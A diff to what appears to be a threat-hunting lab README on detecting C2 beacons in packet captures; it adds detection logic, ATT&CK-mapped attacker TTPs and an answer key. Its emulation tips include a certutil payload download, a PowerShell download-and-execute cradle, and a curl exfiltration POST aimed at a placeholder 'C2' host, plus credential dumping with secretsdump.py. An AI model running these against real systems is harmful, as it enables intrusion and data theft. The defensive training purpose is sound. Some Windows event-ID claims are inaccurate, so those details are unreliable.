@@ -92,7 +92,7 @@ Generator notes: `text2pcap` converts an ASCII hex dump (the offset+hex format p
 sha256sum exercise/c2_hunt.pcap
 ```
 
-Deliverables: the C2 IP, the beacon URI, and a YARA rule that matches the exported object.
+Deliverables: the C2 IP, the beacon URI, and a YARA rule that matches the extracted object.
 
 ## SOC analyst perspective
 A defender ingests full-packet capture and Zeek/Suricata logs in Security Onion, then pivots to the raw PCAP for confirmation. Using tshark you rapidly triage a capture at scale — protocol hierarchy (`-z io,phs`) and conversation statistics (`-z conv,ip`) surface a low-and-slow beacon that periodic `http.request` filtering confirms.
@@ -108,6 +108,15 @@ Concrete detection logic and pivots:
 
 Map findings to ATT&CK **T1071 (Application Layer Protocol)** and **T1071.001 (Web Protocols)** for detection engineering, alert tuning, and incident scoping during an active intrusion. Encrypted beacons should also be scoped against **T1573 (Encrypted Channel)** and off-port beacons against **T1571 (Non-Standard Port)**.
 
+**Additional detection engineering logic:**
+- **Beacon periodicity detection**: Compute the coefficient of variation (standard deviation / mean) of inter-arrival times between connections from a single internal host to a single external IP. A low coefficient (<0.1) suggests automated, periodic beacons (T1071.001). This can be implemented in Zeek via the `conn_state` timer or in Elastic via aggregations on `@timestamp` differences.
+- **JA3/S TLS fingerprinting**: Extract JA3 hashes from Zeek `ssl.log` (`ja3` field) and compare against known malicious fingerprints from threat intelligence feeds. A single internal host using multiple, rare JA3 values to the same external IP may indicate tool diversity or evasion (T1573). The JA3 plugin for Zeek is documented at https://github.com/salesforce/ja3.
+- **DNS tunneling detection**: Flag DNS queries with high entropy subdomains (e.g., Shannon entropy > 4.5) and/or unusual query types (e.g., TXT, NULL) that return large responses. In Zeek `dns.log`, hunt for `query` values like `sd7f9a8d7f.example.com` where the subdomain appears random, indicative of T1568.002 (Domain Generation Algorithms) or T1572 (Protocol Tunneling).
+- **Process injection correlation**: In Windows Event ID 4688, look for `CreateRemoteThread` API calls originating from processes like `powershell.exe` or `rundll32.exe` targeting legitimate system processes (e.g., `svchost.exe`). This is a strong indicator of T1055.001 (Dynamic-link Library Injection) often used to hide C2 traffic within a trusted process. Correlate with network connections from the injected process (Event ID 5156).
+- **Non-standard port usage**: Use Zeek `conn.log` to flag connections where the `service` field (Zeek's inferred application protocol) does not match the destination port. For example, HTTP traffic on port 8080 is common, but HTTP on port 4444 is suspicious (T1571). Build a baseline of allowed port/protocol pairs and alert on deviations.
+- **Data Exfiltration Detection (T1041)**: Hunt for large, sustained outbound data transfers from a single host to an external IP. In Zeek `conn.log`, filter for `orig_bytes > 100MB` and `duration > 300s`. Correlate with Windows Event ID 5156 to identify the responsible process. This pattern is indicative of data staging and exfiltration over the C2 channel. See MITRE ATT&CK T1041: https://attack.mitre.org/techniques/T1041/.
+- **Credential Dumping via Network (T1003)**: Monitor for network traffic patterns associated with credential dumping tools like Mimikatz. In Zeek `conn.log`, look for connections from a host to a domain controller on port 445 (SMB) followed by immediate outbound connections to a suspicious external IP. Correlate with Windows Security Event ID 4624 (logon) and 4688 (process creation) for `lsass.exe` access. See MITRE ATT&CK T1003: https://attack.mitre.org/techniques/T1003/.
+
 ## Attacker perspective
 An adversary establishes C2 by having implanted malware beacon to a controller over ordinary-looking protocols (HTTP/HTTPS, DNS) to blend with normal traffic. Concrete TTPs and the artifacts they leave:
 - **T1071.001 (Web Protocols):** implant sends periodic GET/POST to a fixed callback path (e.g. `/gate.php`). Artifacts: repeated same-URI requests, distinctive/short User-Agent strings, and payload markers recoverable from PCAP and matchable with YARA.
@@ -117,8 +126,21 @@ An adversary establishes C2 by having implanted malware beacon to a controller o
 - **T1090.004 (Domain Fronting) / T1102 (Web Service):** hiding behind legitimate CDNs or SaaS. Artifact: SNI/Host header mismatch. See https://attack.mitre.org/techniques/T1090/004/ and https://attack.mitre.org/techniques/T1102/.
 - **T1105 (Ingress Tool Transfer):** adversary downloads additional tools or payloads over the C2 channel. Artifacts: HTTP POST requests with binary content, large objects in `--export-objects`, and YARA detection against known tool signatures. See https://attack.mitre.org/techniques/T1105/.
 - **T1059.001 (PowerShell):** C2 scripts executed via PowerShell. Artifacts: Zeek `http.log` with PowerShell script URIs, Windows Event ID 4688 showing `powershell.exe -Command` with encoded arguments, and Suricata rules matching common PowerShell download cradle patterns (e.g., `System.Net.WebClient`). See https://attack.mitre.org/techniques/T1059/001/.
+- **T1027 (Obfuscated Files or Information):** Adversaries obfuscate payloads in transit using encoding (base64, hex) or encryption. Artifacts: high entropy content in HTTP bodies, unusual Content-Type headers (e.g., `application/octet-stream` for text), and patterns like `powershell -e` (base64 encoded command) in logs. See https://attack.mitre.org/techniques/T1027/.
+- **T1562.001 (Disable or Modify Tools):** Adversaries may disable host-based firewalls or logging before establishing C2. Artifacts: Windows Event ID 4700 (security disabled) or abrupt cessation of security log events from a host preceding beacon traffic. See https://attack.mitre.org/techniques/T1562/001/.
+- **T1041 (Exfiltration Over C2 Channel):** Adversaries exfiltrate data over the established C2 channel. Artifacts: large, sustained outbound data transfers from a single host, often using POST requests or raw TCP streams. In Zeek `conn.log`, look for high `orig_bytes` and long `duration`. See https://attack.mitre.org/techniques/T1041/.
+- **T1003 (Credential Dumping):** Adversaries dump credentials from memory and exfiltrate them over C2. Artifacts: network traffic from a host to a domain controller (port 445) followed by outbound connections to a C2 IP. Windows Event ID 4688 may show processes like `mimikatz.exe` or `procdump.exe` accessing `lsass.exe`. See https://attack.mitre.org/techniques/T1003/.
 
 Evasion: attackers tune sleep timers and add jitter to defeat naive periodicity detection, rotate URIs/User-Agents, and encrypt payloads. Even so, durable signatures — fixed URIs, User-Agent artifacts, TLS/JA3 fingerprints, and payload markers — persist in captured traffic and give hunters something to pivot on across hosts.
+
+**Concrete emulation tips:**
+- Deploy a HTTP beacon using `python3 -m http.server 8080` and a client that periodically GETs a static path. Mimics T1071.001 with no added jitter – easily detected.
+- Use `certutil -urlcache -split -f http://C2/beacon.dll` to simulate T1105 download; logs appear in Windows Event 4688 for `certutil.exe` and in Zeek `http.log` with URI `/beacon.dll`.
+- For PowerShell C2, run `powershell -e <base64>` with a download cradle: `Invoke-Expression (New-Object Net.WebClient).DownloadString('http://C2/script.ps1')`. Zeek logs show the URI and User-Agent, while Windows Event 4688 captures the command line.
+- To simulate T1568.002 (DGA), generate domain names with a script and perform DNS lookups; Zeek `dns.log` will capture the high-entropy queries.
+- For T1573 (Encrypted Channel), use a self-signed certificate for HTTPS C2; Zeek `ssl.log` will record the `validation_status` as `self signed`.
+- For T1041 (Exfiltration), use `curl -X POST --data-binary @largefile.txt http://C2/upload` to simulate data exfiltration; Zeek `http.log` will show a POST request with a large `request_body_len`.
+- For T1003 (Credential Dumping), use a tool like `secretsdump.py` from Impacket to dump credentials over SMB; Zeek `conn.log` will show SMB traffic and subsequent outbound connections.
 
 ## Answer key
 Expected findings:
@@ -170,6 +192,10 @@ sha256sum exercise/c2_hunt.pcap
 - **T1059.001 — Command and Scripting Interpreter: PowerShell** (https://attack.mitre.org/techniques/T1059/001/) (PowerShell-based C2).
 - **T1027 — Obfuscated Files or Information** (https://attack.mitre.org/techniques/T1027/) (encoded/encrypted payloads in transit).
 - **T1562 — Impair Defenses** (https://attack.mitre.org/techniques/T1562/) (disable logging or AV before C2 activity).
+- **T1055.001 — Process Injection: Dynamic-link Library Injection** (https://attack.mitre.org/techniques/T1055/001/) (injecting C2 payloads into legitimate processes).
+- **T1562.001 — Impair Defenses: Disable or Modify Tools** (https://attack.mitre.org/techniques/T1562/001/) (disabling security tools prior to C2).
+- **T1003 — Credential Dumping** (https://attack.mitre.org/techniques/T1003/) (dumping credentials and exfiltrating over C2).
+- **T1048 — Exfiltration Over Alternative Protocol** (https://attack.mitre.org/techniques/T1048/) (exfiltrating data over non-standard protocols).
 - **DFIR phases:** Identification (spot beacon in traffic), Examination/Analysis (filter, export objects, YARA-confirm), Reporting (map to ATT&CK). These phases follow the SANS DFIR / FOR508 investigative workflow (https://www.sans.org/cyber-security-courses/advanced-incident-response-threat-hunting/).
 
 ### Threat Hunting & Detection Engineering
@@ -189,14 +215,6 @@ Leverage Suricata’s `fileinfo` keyword to detect **Non-Application Layer Proto
 - [Microsoft: Event 4688 – Process Creation](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688)
 - [Microsoft: Event 5156 – WFP Connection](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-5156)
 - [Zeek JA3 plugin documentation](https://github.com/salesforce/ja3)
-
-### Adversary Emulation & Red-Team Perspective
-Adversaries may leverage the network hunting environment to their advantage by employing techniques such as [T1204](https://attack.mitre.org/techniques/T1204) - User Execution, where they trick users into executing malicious commands or scripts, and [T1218](https://attack.mitre.org/techniques/T1218) - Signed Binary Proxy Execution, which allows them to execute malicious code by proxying it through signed binaries. To achieve this, attackers may create malicious artifacts such as suspicious scripts, executable files, or modified system binaries. Network defenders should be aware of these tactics and monitor for signs of adversary emulation, such as unusual network activity or changes to system files. To evade detection, attackers may use code obfuscation or anti-debugging techniques, making it essential for defenders to employ robust detection and analysis tools. For more information on adversary emulation and red-team tactics, visit the [Cyber and Infrastructure Security Agency (CISA)](https://www.cisa.gov/) and [NSA Cybersecurity](https://www.nsa.gov/What-We-Do/Cybersecurity/) websites.
-
-**Concrete emulation tips:**
-- Deploy a HTTP beacon using `python3 -m http.server 8080` and a client that periodically GETs a static path. Mimics T1071.001 with no added jitter – easily detected.
-- Use `certutil -urlcache -split -f http://C2/beacon.dll` to simulate T1105 download; logs appear in Windows Event 4688 for `certutil.exe` and in Zeek `http.log` with URI `/beacon.dll`.
-- For PowerShell C2, run `powershell -e <base64>` with a download cradle: `Invoke-Expression (New-Object Net.WebClient).DownloadString('http://C2/script.ps1')`. Zeek logs show the URI and User-Agent, while Windows Event 4688 captures the command line.
 
 ### Essential Commands & Features
 
@@ -263,8 +281,16 @@ Claim → source mapping (all URLs are official/authoritative):
 - MITRE ATT&CK T1059.001 (PowerShell) — https://attack.mitre.org/techniques/T1059/001/
 - MITRE ATT&CK T1027 (Obfuscated Files or Information) — https://attack.mitre.org/techniques/T1027/
 - MITRE ATT&CK T1562 (Impair Defenses) — https://attack.mitre.org/techniques/T1562/
+- MITRE ATT&CK T1562.001 (Impair Defenses: Disable or Modify Tools) — https://attack.mitre.org/techniques/T1562/001/
+- MITRE ATT&CK T1055.001 (Process Injection: Dynamic-link Library Injection) — https://attack.mitre.org/techniques/T1055/001/
 - MITRE ATT&CK T1090.003 (Multi-hop Proxy) — https://attack.mitre.org/techniques/T1090/003/
 - MITRE ATT&CK T1572 (Protocol Tunneling) — https://attack.mitre.org/techniques/T1572/
+- MITRE ATT&CK T1003 (Credential Dumping) — https://attack.mitre.org/techniques/T1003/
+- MITRE ATT&CK T1048 (Exfiltration Over Alternative Protocol) — https://attack.mitre.org/techniques/T1048/
+- MITRE ATT&CK T1132.001 (Data Encoding: Standard Encoding) — https://attack.mitre.org/techniques/T1132/001/
+- MITRE ATT&CK T1095 (Non-Application Layer Protocol) — https://attack.mitre.org/techniques/T1095/
+- MITRE ATT&CK T1588 (Obtain Capabilities) — https://attack.mitre.org/techniques/T1588/
+- MITRE ATT&CK T1595 (Active Scanning) — https://attack.mitre.org/techniques/T1595/
 - Zeek `http.log` fields — https://docs.zeek.org/en/master/logs/http.html
 - Zeek `conn.log` fields — https://docs.zeek.org/en/master/logs/conn.html
 - Suricata HTTP keywords for rules — https://docs.suricata.io/en/latest/rules/http-keywords.html
@@ -285,4 +311,4 @@ Claim → source mapping (all URLs are official/authoritative):
 - [Scenario: ransomware memory investigation](../47-ransomware-memory-case/README.md) -- shares yara for pattern-matching carved artifacts.
 - [Malware static triage](../08-malware-static-triage/README.md) -- shares yara for authoring and running detection rules.
 
-<!-- cyberlab-enriched: v4 -->
+<!-- cyberlab-enriched: v5 -->
